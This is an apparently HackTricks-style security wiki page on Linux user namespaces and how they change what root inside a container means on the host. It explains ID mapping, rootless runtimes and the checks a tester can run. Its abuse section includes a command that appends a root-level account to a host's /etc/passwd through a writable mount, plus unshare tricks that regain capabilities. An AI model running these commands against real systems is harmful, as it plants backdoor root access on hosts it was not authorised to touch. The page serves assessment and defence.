# User Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Overview

The user namespace changes the meaning of user and group IDs by letting the kernel map IDs seen inside the namespace to different IDs outside it. This is one of the most important modern container protections because it directly addresses the biggest historical problem in classic containers: **root inside the container used to be uncomfortably close to root on the host**.

With user namespaces, a process may run as UID 0 inside the container and still correspond to an unprivileged UID range on the host. That means the process can behave like root for many in-container tasks while being much less powerful from the host's point of view. This does not solve every container security problem, but it changes the consequences of a container compromise significantly.

## Operation

A user namespace has mapping files such as `/proc/self/uid_map` and `/proc/self/gid_map` that describe how namespace IDs translate to parent IDs. If root inside the namespace maps to an unprivileged host UID, then operations that would require real host root simply do not carry the same weight. This is why user namespaces are central to **rootless containers** and why they are one of the biggest differences between older rootful container defaults and more modern least-privilege designs.

The point is subtle but crucial: root inside the container is not eliminated, it is **translated**. The process still experiences a root-like environment locally, but the host should not be treating it as full root.

## Lab

A manual test is:

```bash
unshare --user --map-root-user --fork bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
```

This makes the current user appear as root inside the namespace while still not being host root outside it. It is one of the best simple demos for understanding why user namespaces are so valuable.

In containers, you can compare the visible mapping with:

```bash
docker run --rm debian:stable-slim sh -c 'id && cat /proc/self/uid_map'
```

The exact output depends on whether the engine is using user namespace remapping or a more traditional rootful configuration.

You can also read the mapping from the host side with:

```bash
cat /proc/<pid>/uid_map
cat /proc/<pid>/gid_map
```

## Runtime Usage

Rootless Podman is one of the clearest examples of user namespaces being treated as a first-class security mechanism. Rootless Docker also depends on them. Docker's userns-remap support improves safety in rootful daemon deployments too, although historically many deployments left it disabled for compatibility reasons. Kubernetes support for user namespaces has improved, but adoption and defaults vary by runtime, distro, and cluster policy. Incus/LXC systems also rely heavily on UID/GID shifting and idmapping ideas.

The general trend is clear: environments that use user namespaces seriously usually provide a better answer to "what does container root actually mean?" than environments that do not.

## Advanced Mapping Details

When an unprivileged process writes to `uid_map` or `gid_map`, the kernel applies stricter rules than it does for a privileged parent namespace writer. Only limited mappings are allowed, and for `gid_map` the writer usually needs to disable `setgroups(2)` first:

```bash
cat /proc/self/setgroups
echo deny > /proc/self/setgroups
```

This detail matters because it explains why user-namespace setup sometimes fails in rootless experiments and why runtimes need careful helper logic around UID/GID delegation.

Another advanced feature is the **ID-mapped mount**. Instead of changing on-disk ownership, an ID-mapped mount applies a user-namespace mapping to a mount so that ownership appears translated through that mount view. This is especially relevant in rootless and modern runtime setups because it allows shared host paths to be used without recursive `chown` operations. Security-wise, the feature changes how writable a bind mount appears from inside the namespace, even though it does not rewrite the underlying filesystem metadata.

Finally, remember that when a process creates or enters a new user namespace, it receives a full capability set **inside that namespace**. That does not mean it suddenly gained host-global power. It means those capabilities can be used only where the namespace model and other protections allow them. This is the reason `unshare -U` can suddenly make mounting or namespace-local privileged operations possible without directly making the host root boundary disappear.

## Misconfigurations

The major weakness is simply not using user namespaces in environments where they would be feasible. If container root maps too directly to host root, writable host mounts and privileged kernel operations become much more dangerous. Another problem is forcing host user namespace sharing or disabling remapping for compatibility without recognizing how much that changes the trust boundary.

User namespaces also need to be considered together with the rest of the model. Even when they are active, a broad runtime API exposure or a very weak runtime configuration can still allow privilege escalation through other paths. But without them, many old breakout classes become much easier to exploit.

## Abuse

If the container is rootful without user namespace separation, a writable host bind mount becomes vastly more dangerous because the process may really be writing as host root. Dangerous capabilities likewise become more meaningful. The attacker no longer needs to fight as hard against the translation boundary because the translation boundary barely exists.

User namespace presence or absence should be checked early when evaluating a container breakout path. It does not answer every question, but it immediately shows whether "root in container" has direct host relevance.

The most practical abuse pattern is to confirm the mapping and then immediately test whether host-mounted content is writable with host-relevant privileges:

```bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
touch /host/tmp/userns_test 2>/dev/null && echo "host write works"
ls -ln /host/tmp/userns_test 2>/dev/null
```

If the file is created as real host root, user namespace isolation is effectively absent for that path. At that point, classic host-file abuses become realistic:

```bash
echo 'x:x:0:0:x:/root:/bin/bash' >> /host/etc/passwd 2>/dev/null || echo "passwd write blocked"
cat /host/etc/passwd | tail
```

A safer confirmation on a live assessment is to write a benign marker instead of modifying critical files:

```bash
echo test > /host/root/userns_marker 2>/dev/null
ls -l /host/root/userns_marker 2>/dev/null
```

These checks matter because they answer the real question fast: does root in this container map closely enough to host root that a writable host mount immediately becomes a host compromise path?

### Full Example: Regaining Namespace-Local Capabilities

If seccomp allows `unshare` and the environment permits a fresh user namespace, the process may regain a full capability set inside that new namespace:

```bash
unshare -UrmCpf bash
grep CapEff /proc/self/status
mount -t tmpfs tmpfs /mnt 2>/dev/null && echo "namespace-local mount works"
```

This is not by itself a host escape. The reason it matters is that user namespaces can re-enable privileged namespace-local actions that later combine with weak mounts, vulnerable kernels, or badly exposed runtime surfaces.

## Checks

These commands are meant to answer the most important question in this page: what does root inside this container map to on the host?

```bash
readlink /proc/self/ns/user   # User namespace identifier
id                            # Current UID/GID as seen inside the container
cat /proc/self/uid_map        # UID translation to parent namespace
cat /proc/self/gid_map        # GID translation to parent namespace
cat /proc/self/setgroups 2>/dev/null   # GID-mapping restrictions for unprivileged writers
```

What is interesting here:

- If the process is UID 0 and the maps show a direct or very close host-root mapping, the container is much more dangerous.
- If root maps to an unprivileged host range, that is a much safer baseline and usually indicates real user namespace isolation.
- The mapping files are more valuable than `id` alone, because `id` only shows the namespace-local identity.

If the workload runs as UID 0 and the mapping shows that this corresponds closely to host root, you should interpret the rest of the container's privileges much more strictly.
{{#include ../../../../../banners/hacktricks-training.md}}
